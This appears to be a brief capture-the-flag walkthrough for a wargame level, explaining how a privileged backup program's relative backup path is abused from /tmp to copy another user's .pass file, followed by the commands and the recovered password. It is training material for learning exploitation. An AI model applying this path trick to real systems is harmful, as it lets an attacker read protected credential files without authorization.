Program behavior:
1. Opens log file with `fopen` function;
2. Takes a filename as an argument and opens it with `fopen` function;
3. Creates a backup file with `open` function;
4. Copies content of original file to backup file using `fgetc` function;
5. Writes some logs in log file along the way.

Solution:
Call the executable from a folder with write permission.

# Create the same path at `/tmp/` folder.
mkdir -p /tmp/backups/home/users/level09
# Change directory
cd /tmp
# Launch the executable
~/level08 /home/users/level09/.pass
# Check the flag
cat ./backups/home/users/level09/.pass
`fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S`
